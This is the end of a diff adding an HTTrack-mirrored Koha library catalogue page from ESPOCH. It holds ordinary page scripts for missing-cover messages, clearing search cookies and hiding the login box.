+        var NO_GOOGLE_JACKET = _("No hay imagen de cubierta disponible");
+
+    </script>
+
+ <script src="https://biblioteca.espoch.edu.ec/opac-tmpl/bootstrap/js/localcovers_22.0506000.js"></script>
+ <script>
+
+    var NO_LOCAL_JACKET = _("No hay imagen de cubierta disponible");
+
+    </script>
+<script src="https://biblioteca.espoch.edu.ec/opac-tmpl/lib/js-cookie/js.cookie-3.0.1.min_22.0506000.js"></script>
+<script>
+$(document).ready(function() {
+    if($('#searchsubmit').length) {
+        $(document).on("click", '#searchsubmit', function(e) {
+            Cookies.remove("form_serialized", { path: '/'});
+            Cookies.remove("form_serialized_limits", { path: '/'});
+            Cookies.remove("search_path_code", { path: '/'});
+        });
+    }
+});
+</script>
+ <script>
+        /* Esconde caja login OPAC usuarios */
+  $("#login").hide();
+
+
+    </script>
+</body>
+
+<!-- Mirrored from biblioteca.espoch.edu.ec/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 12 Jan 2025 21:04:40 GMT -->
+</html>
+
+
